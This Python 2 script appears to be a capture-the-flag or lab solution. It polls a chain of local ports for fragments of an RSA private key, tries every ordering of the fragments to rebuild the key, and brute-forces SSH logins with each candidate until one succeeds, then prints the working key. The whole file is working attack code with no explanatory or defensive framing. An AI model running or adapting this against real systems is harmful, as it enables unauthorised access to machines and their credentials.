#!/usr/bin/env python

import socket
import sys,os
import time
from itertools import permutations
import paramiko
import StringIO

port = sys.argv[1]
user = sys.argv[2]
host = "127.0.0.1"
key = {}



def sshconnect(mykey, privkey):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=user, pkey = mykey)
    stdin, stdout, stderr = ssh.exec_command('uname -a')
    sshstdout = stdout.readlines()
    if sshstdout:
        print "\r\nSuccess! =&gt; ", str(sshstdout[0].strip())
        print "\r\nValid Key is: \r\n", privkey
        print "-------------------------------------------------------------------------------------------------------------"
    sys.exit()



def permeate(key) :
    keyList = []
    count = 0
    for port,string in key.iteritems() :
        keyList.append(string)
    permute = permutations(keyList, len(keyList))
    for a in permute :
        sys.stdout.flush()
        key_string = "".join(a)
        count = count + 1
        #sys.stdout.write("SSH key combo - SSH Attempt number:" + str(count)),"\r\n"
        print"SSH key combo - SSH Attempt number:" + str(count)," "
        #sys.stdout.write(key_string)

        privkey = '-----BEGIN RSA PRIVATE KEY-----\n' + key_string + '\n-----END RSA PRIVATE KEY-----\n'
        #print "\r\n",privkey
        try :
            mykey = paramiko.RSAKey.from_private_key((StringIO.StringIO(str(privkey))))
        except Exception as e :
            print "Form Key Error:", str(e)
            continue
        try :
            sshconnect(mykey, privkey)
            time.sleep(1)
        except Exception as e :
            print str(e)
            continue

def dataparse(key,data) :
    data = data.rstrip()
    port = data[-5:].strip("?")
    key[port] = ((data[:-5]).strip("?").strip("00000000"))
    return(port,key)


def portconnect(host,port,key) :
    while True:
        try :
            print "Connecting..."
            client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            connect = client.connect((host,int(port)))
            data = client.recv(1024).strip()
            client.close()
            port,key = dataparse(key,data)
            time.sleep(1)
        except Exception as e :
            print str(e), "\nAll sockets complete or error in access."
            break         
    for port,string in key.iteritems() :
        print port, string
    return key

def main() :
    keydict = portconnect(host,port,key)
    permeate(keydict)

if __name__ == "__main__" :
    main()
